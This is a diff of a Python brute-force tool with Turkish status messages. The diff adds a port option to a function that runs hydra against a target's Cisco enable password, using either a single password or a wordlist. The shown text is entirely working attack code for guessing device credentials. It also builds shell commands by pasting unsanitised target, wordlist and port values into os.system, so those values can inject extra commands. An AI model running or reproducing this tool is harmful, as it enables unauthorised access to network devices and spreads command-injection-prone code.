@@ -451,20 +451,20 @@ def basicauth(user,worldlist,target,useradet,passadet):
 
 #Firewall Brute Force,Usernamesiz(cisco AAA)
 
-def firewallbrute(worldlist,target,passadet):
+def firewallbrute(worldlist,target,passadet,port):
     os.system("clear")
     banner()
 
     if passadet == 1:
         print("İşlem Başlatılıyor")
         bekle.sleep(3)
-        os.system("hydra -p "+worldlist+" "+target+" cisco-enable")
+        os.system("hydra -p "+worldlist+" "+target+" cisco-enable -s "+port)
         bekle.sleep(3)
         print("İşlem Bitti")
     elif passadet > 1:
         print("İşlem Başlatılıyor")
         bekle.sleep(3)
-        os.system("hydra -P "+worldlist+" "+target+" cisco-enable")
+        os.system("hydra -P "+worldlist+" "+target+" cisco-enable -s "+port)
         bekle.sleep(3)
         print("İşlem Bitti")
     else:
